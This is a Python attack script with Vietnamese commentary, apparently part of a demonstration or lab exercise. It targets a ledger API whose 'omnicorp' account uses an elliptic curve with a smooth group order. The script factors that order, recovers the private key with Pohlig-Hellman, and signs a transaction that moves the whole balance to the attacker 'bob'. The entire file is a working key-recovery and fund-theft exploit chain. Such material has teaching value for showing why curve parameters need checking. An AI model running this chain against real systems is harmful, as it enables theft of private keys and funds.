"""TẤN CÔNG 3 — ĐƯỜNG CONG YẾU / Pohlig-Hellman (qua HTTP, API công khai thật).

Tài khoản enterprise 'omnicorp' dùng đường cong TRÔNG Y NHƯ THẬT: cùng dạng
secp256k1 (y² = x³ + b, a = 0), trường nguyên tố ~256 bit, bậc điểm sinh n ~256 bit
— nhìn tham số (a, b, p, n, G) không phân biệt được với đường cong chuẩn.

NHƯNG khi PHÂN TÍCH THỪA SỐ của n, kẻ tấn công phát hiện n là số TRƠN (mọi thừa số
nguyên tố nhỏ). Với bậc trơn, ECDLP sụp đổ: Pohlig-Hellman chẻ nhỏ theo từng thừa số
rồi ghép CRT, khôi phục KHÓA RIÊNG trong ~10-15s (thay vì ~2^128). Sau đó ký giao
dịch rút sạch omnicorp về 'bob'.

    python attack_weakcurve.py     (mất ~10-15s do chạy Pohlig-Hellman)
"""
import time

from common import (banner, step, info, ok, bad, impact, money, get, post,
                    curve_from_info, factorize, pohlig_hellman_dlog, sign_transfer)

ATTACKER = "bob"
VICTIM = "omnicorp"


def main():
    banner("TẤN CÔNG 3 — ĐƯỜNG CONG YẾU (Pohlig-Hellman)  →  rút sạch OmniCorp")

    step(1, "Lấy khóa công khai + tham số đường cong (GET /api/accounts)")
    _, accounts = get("/api/accounts")
    mc = next((a for a in accounts if a["user"] == VICTIM), None)
    if not mc:
        return bad("Không thấy tài khoản omnicorp")
    curve = curve_from_info(mc["curve"])
    Q = curve.point(int(mc["pub"]["x"]), int(mc["pub"]["y"]))
    info("Trường F_p", f"~{curve.p.bit_length()} bit  (trông như đường cong thật)")
    info("Bậc điểm sinh n", f"~{curve.n.bit_length()} bit  (nhìn CŨNG như đường cong thật)")

    step(2, "Phân tích thừa số bậc nhóm n — điểm gần như không ai kiểm tra")
    factors = factorize(curve.n)
    q = max(factors)
    info("Số thừa số nguyên tố của n", len(factors))
    info("Thừa số lớn nhất q", f"{q}  (~2^{q.bit_length()-1})")
    ok("n ~256 bit nhưng TRƠN → độ khó ECDLP chỉ còn ~√q, không phải ~2^128")

    step(3, "Giải ECDLP bằng Pohlig-Hellman (chẻ theo thừa số + BSGS + CRT)…")
    print("    (đang chạy, mất ~10-15 giây)")
    t0 = time.time()
    d, _ = pohlig_hellman_dlog(curve, curve.G, Q, curve.n, factors)
    dt = time.time() - t0
    info("KHÓA RIÊNG d", d)
    ok(f"d·G == Q: KHỚP  (Pohlig-Hellman mất {dt:.1f}s)"
       if curve.mul(d, curve.G) == Q else "SAI")

    step(4, "Ký giao dịch rút sạch omnicorp về 'bob' (POST /api/tx/submit)")
    _, state = get("/api/state")
    amount = next(a["balance"] for a in state["accounts"] if a["user"] == VICTIM)
    # Bậc n là HỢP SỐ (trơn) nên một số (khóa d, thông điệp z) không ký được ECDSA
    # (gcd(d, z, n) > 1). Kẻ tấn công tự chọn mã giao dịch, nên chỉ cần đổi tx id
    # (→ đổi z) tới khi ký được — đây cũng là hệ quả của việc bậc nhóm không nguyên tố.
    tx = r = s = None
    nid = state["next_id"]                     # số thứ tự giao dịch hiện tại (đồng bộ với server)
    for i in range(256):
        try:
            tx, r, s = sign_transfer(curve, d, VICTIM, ATTACKER, amount, nid + i)
            break
        except ValueError:
            continue
    if tx is None:
        return bad("Không ký được giao dịch (bậc hợp số) sau nhiều lần đổi mã giao dịch")
    stt, res = post("/api/tx/submit", {**tx, "r": str(r), "s": str(s)})
    if isinstance(res, dict) and res.get("ok"):
        impact(f"Rút {money(amount)} CBC từ OmniCorp về '{ATTACKER}'")
    else:
        bad(res.get("message") if isinstance(res, dict) else str(res))


if __name__ == "__main__":
    main()
